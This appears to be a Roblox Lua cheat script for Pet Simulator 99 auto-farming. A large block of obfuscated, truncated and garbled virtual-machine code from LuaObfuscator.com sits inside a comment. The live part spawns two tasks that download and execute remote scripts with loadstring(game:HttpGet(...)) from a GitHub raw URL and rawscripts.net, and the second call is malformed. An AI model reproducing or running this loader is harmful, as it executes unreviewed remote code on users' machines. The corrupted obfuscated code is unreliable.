--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 


local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v85=v2(v0(v30,16));if v19 then local v115=0;local v116;while true do if (v115==1) then return v116;end if (v115==0) then v116=v5(v85,v19);v19=nil;v115=1;end end else return v85;end end end);local function v20(v31,v32,v33) if v33 then local v86=0 -0 ;local v87;while true do if (v86==(0 -0)) then v87=(v31/(2^(v32-(1 -0))))%((1 + 1)^(((v33-((879 -(282 + 595)) -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v87-(v87%(569 -((2004 -(1523 + 114)) + 201))) ;end end else local v88=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v88 + v88))>=v88) and (1 + 0)) or 0 ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (2 -0) );v18=v18 + 2 ;return (v36 * (1321 -(68 + 997))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (1273 -((1183 -(892 + 65)) + 1044)) );v18=v18 + (17 -13) ;return (v40 * (16777333 -(32 + (202 -117)))) + (v39 * (64226 + 1310)) + (v38 * (57 + 199)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1 -0 ;local v44=(v20(v42,1 -0 ,370 -(87 + 263) ) * ((182 -(12 + 55 + 113))^(24 + 8))) + v41 ;local v45=v20(v42,(90 -39) -30 ,23 + 0 + 8 );local v46=((v20(v42,32)==(3 -2)) and  -1) or (953 -(802 + 150)) ;if (v45==(0 -0)) then if (v44==0) then return v46 * (0 -0) ;else local v117=(791 -(368 + 423)) + 0 ;while true do if (v117==(997 -(915 + 82))) then v45=2 -1 ;v43=0;break;end end end elseif (v45==(1193 + 854)) then return ((v44==0) and (v46 * (1/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-((6945 -4735) -(1069 + (136 -(10 + 8)))) ) * (v43 + (v44/(((15 -11) -2)^((555 -(416 + 26)) -61)))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -1 );v18=v18 + v47 ;local v49={};for v66=1 + 0 , #v48 do v49[v66]=v2(v1(v3(v48,v66,v66)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v89,v90,v91,v92,v93,v94,v95,v96) local v89=(function() return 808 -(740 + 68) ;end)();local v90=(function() return;end)();local v91=(function() return;end)();while true do if (v89~= #"{") then else if (v90== #"\\") then v91=(function() return v92()~=(0 + 0) ;end)();elseif (v90==(838 -(660 + 176))) then v91=(function() return v93();end)();elseif (v90~= #"xnx") then else v91=(function() return v94();end)();end v95[v96]=(function() return v91;end)();break;end if (v89==(0 + 0)) then local v123=(function() return 0;end)();while true do if (v123==(203 -(14 + 188))) then v89=(function() return  #".";end)();break;end if (v123==0) then v90=(function() return v92();end)();v91=(function() return nil;end)();v123=(function() return 676 -(534 + 141) ;end)();end end end end return v89,v90,v91,v92,v93,v94,v95,v96;end;end)();local v51=(function() return function(v97,v98,v99,v100,v101,v102,v103,v104,v105) local v106=(function() return 0;end)();local v97=(function() return;end)();local v98=(function() return;end)();while true do if (v106==(0 + 0)) then local v124=(function() return 0 + 0 ;end)();while true do if (v124==0) then v97=(function() return 0 + 0 ;end)();v98=(function() return nil;end)();v124=(function() return 1;end)();end if (v124==1) then v106=(function() return 1;end)();break;end end end if ((1 -0)~=v106) then else local v125=(function() return 0 -0 ;end)();while true do if (v125~=(0 -0)) then else local v126=(function() return 0;end)();while true do if (v126==(0 + 0)) then while true do if (v97==(0 + 0)) then v98=(function() return v99();end)();if (v100(v98, #"!", #"!")~=0) then else local v183=(function() return 0;end)();local v184=(function() return;end)();local v185=(function() return;end)();local v186=(function() return;end)();local v187=(function() return;end)();while true do if ((398 -(115 + 281))==v183) then while true do if (v184== #"~") then local v195=(function() return 0 -0 ;end)();local v196=(function() return;end)();while true do if (v195~=(0 + 0)) then else v196=(function() return 0;end)();while true do if (v196==0) then v187=(function() return {v101(),v101(),nil,nil};end)();if (v185==0) then local v203=(function() return 0;end)();local v204=(function() return;end)();while true do if (v203==(0 -0)) then v204=(function() return 867 -(550 + 317) ;end)();while true do if (v204==(0 -0)) then v187[ #"gha"]=(function() return v101();end)();v187[ #"asd1"]=(function() return v101();end)();break;end end break;end end elseif (v185== #"[") then v187[ #"xnx"]=(function() return v102();end)();elseif (v185==(2 -0)) then v187[ #"91("]=(function() return v102() -(2^16) ;end)();elseif (v185== #"xxx") then local v211=(function() return 0 -0 ;end)();local v212=(function() return;end)();while true do if (v211~=0) then else v212=(function() return 285 -(134 + 151) ;end)();while true do if (v212~=(1665 -(970 + 695))) then else v187[ #"gha"]=(function() return v102() -(2^(30 -14)) ;end)();v187[ #".com"]=(function() return v101();end)();break;end end break;end end end v196=(function() return 1;end)();end if (v196~=1) then else v184=(function() return 2;end)();break;end end break;end end end if (0==v184) then local v197=(function() return 1990 -(582 + 1408) ;end)();local v198=(function() return;end)();while true do if (v197==(0 -0)) then v198=(function() return 0 -0 ;end)();while true do if (v198~=0) then else v185=(function() return v100(v98,7 -5 , #"xxx");end)();v186=(function() return v100(v98, #".dev",1830 -(1195 + 629) );end)();v198=(function() return 1 -0 ;end)();end if (v198==1) then v184=(function() return  #"!";end)();break;end end break;end end end if (v184==(243 -(187 + 54))) then local v199=(function() return 0;end)();local v200=(function() return;end)();while true do if (v199~=0) then else v200=(function() return 0;end)();while true do if (v200==1) then v184=(function() return  #"91(";end)();break;end if (v200~=0) then else if (v100(v186, #">", #":")== #"[") then v187[2]=(function() return v103[v187[782 -(162 + 618) ;end)();end if (v100(v186,2 + 0 ,2)== #"}") then v187[ #"xnx"]=(function() return v103[v187[ #"19(";end)();end v200=(function() return 1;end)();end end break;end end end if (v184== #"xxx") then if (v100(v186, #"91(", #"xnx")~= #"~") then else v187[ #"0313"]=(function() return v103[v187[ #"0836";end)();end v104[v105]=(function() return v187;end)();break;end end break;end if (v183~=(0 + 0)) then else local v192=(function() return 0;end)();while true do if (v192~=1) then else v183=(function() return 1;end)();break;end if (v192==0) then v184=(function() return 0 -0 ;end)();v185=(function() return nil;end)();v192=(function() return 1 -0 ;end)();end end end if (v183~=(1 + 0)) then else v186=(function() return nil;end)();v187=(function() return nil;end)();v183=(function() return 2;end)();end end end break;end end return v97,v98,v99,v100,v101,v102,v103,v104,v105;end end end end end end end;end)();local v52=(function() return function(v107,v108,v109) local v110=(function() return 1636 -(1373 + 263) ;end)();local v111=(function() return;end)();while true do if (v110==0) then v111=(function() return 0;end)();while true do if (v111~=0) then else local v127=(function() return 1000 -(451 + 549) ;end)();while true do if (v127~=0) then else v107[v108-#"\\" ]=(function() return v109();end)();return v107,v108,v109;end end end end break;end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #",",v57 do FlatIdent_60EA1,Type,Cons,v21,v24,v25,v58,v68=(function() return v50(FlatIdent_60EA1,Type,Cons,v21,v24,v25,v58,v68);end)();end v56[ #"-19"]=(function() return v21();end)();for v69= #"[",v23() do FlatIdent_8F047,Descriptor,v21,v20,v22,v23,v58,v53,v69=(function() return v51(FlatIdent_8F047,Descriptor,v21,v20,v22,v23,v58,v53,v69);end)();end for v70= #"!",v23() do v54,v70,v28=(function() return v52(v54,v70,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[1 + (0 -0) ];local v64=v60[2 -0 ];local v65=v60[4 -1 ];return function(...) local v71=v63;local v72=v64;local v73=v65;local v74=v27;local v75=851 -(20 + 830) ;local v76= -(1 + 0);local v77={};local v78={...};local v79=v12("#",...) -(1 + 0 + 0) ;local v80={};local v81={};for v112=(0 -0) -0 ,v79 do if ((3794>3693) and (v112>=v73)) then v77[v112-v73 ]=v78[v112 + (342 -(218 + 123)) ];else v81[v112]=v78[v112 + 1 + 0 ];end end local v82=(v79-v73) + (1582 -(1535 + 46)) ;local v83;local v84;while true do v83=v71[v75];v84=v83[1 + 0 ];if ((v84<=(2 + 11)) or (1275==4100)) then if (v84<=(566 -(306 + 254))) then if ((v84<=(1553 -(1126 + 425))) or (1591>=3580)) then if (v84<=(0 + 0)) then v75=v83[11 -8 ];elseif ((983<=1808) and (v84==(1 -0))) then v81[v83[1469 -(899 + 568) =v29(v72[v83[2 + 1 ,nil,v62);else v81[v83[4 -(5 -3) =v29(v72[v83[1 + 2 ,nil,v62);end elseif (v84<=(607 -(268 + 335))) then if ((v84==(293 -(60 + 230))) or (2150<=1197)) then if (v81[v83[574 -(426 + 146) ==v83[4 + 0 ]) then v75=v75 + (1228 -(322 + 905)) + 0 ;else v75=v83[1459 -(282 + 1174) ];end else local v138=v83[813 -(569 + 242) ];v81[v138]=v81[v138](v13(v81,v138 + (612 -(602 + 9)) + 0 ,v76));end elseif (v84==(14 -9)) then do return;end else v81[v83[1 + 1 =v83[1027 -(706 + 318) ];end elseif ((3769>=1173) and (v84<=(19 -10))) then if ((1485==1485) and (v84<=(1258 -(721 + 530)))) then v81[v83[1273 -(945 + 326) =v62[v83[7 -4 ;elseif ((v84>(3 + 5)) or (3315<=2782)) then if (v81[v83[1331 -(797 + 532)==v83[4 + (1189 -(449 + 740)) ]) then v75=v75 + 1 + 0 ;else v75=v83[(1575 -(826 + 46)) -(271 + 429) ];end else v81[v83[1205 -(373 + d elseif (v84<=(11 + 0)) then if (v84>(1510 -(1408 + 92))) then v81[v83[1088 -(461 + 6283[1291 -(993 + 295) local v146=v83[1 + 1 ];local v147=v81[v83[5 -246 + (1172 -(418 + 753)) ]=v147;v81[v146]=v147[v83[2 + (949 -(245 + 702)elseif (v84>(2 + 10)) then v81[v83[1 + 1 1[v83[1 + 2 [2 + 81[v83[(1677 -1146) -(406 + 123)if (v84<=(1789 -(1749 + 20))) then if (v84<=16) then if ((v84<=(5 + 9)) or (876>=2964)) then for v132=v83[1 + 1 ],v83[1325 -(1249 + 73) ] do v81[v132]=nil;end elseif ((v84==(13 + 2)) or (2232>2497)) then v81[v83[1 + 1 3[1507 -(363 + 1141) ];else local v155=v83[1147 -(466 + 679) ];local v156,v157=v74(v81[v155](v13(v81,v155 + (2 -1) ,v83[8 -5 ])));v76=(v157 + v155) -((3799 -(260 + 1638)) -(106 + 1794)) ;local v158=(440 -(382 + 58)) + 0 ;for v178=v155,v76 do local v179=0 + 0 ;while true do if (v179==(1975 -(1913 + 62))) then v158=v158 + 1 + (0 -0) ;v81[v178]=v156[v158];break;end end end end elseif ((v84<=(47 -(25 + 4))) or (2110<=332)) then if (v84==(5 + 12)) then local v159=v83[5 -3 ];v81[v159](v81[v159 + (2 -1) ]);else local v160=v83[2 -0 ];local v161=v81[v83[117 -(4 + 110) 






















































































]]--


local function taskOne()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Xeart3487/ps99/refs/heads/main/2.lua'))()
end
local function taskTwo()
    loadstring(game:HttpGet('loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Auto-Area-Multi-Farm-Auto-Index-16263"))()'))()
end

task.spawn(taskOne)
task.spawn(taskTwo)
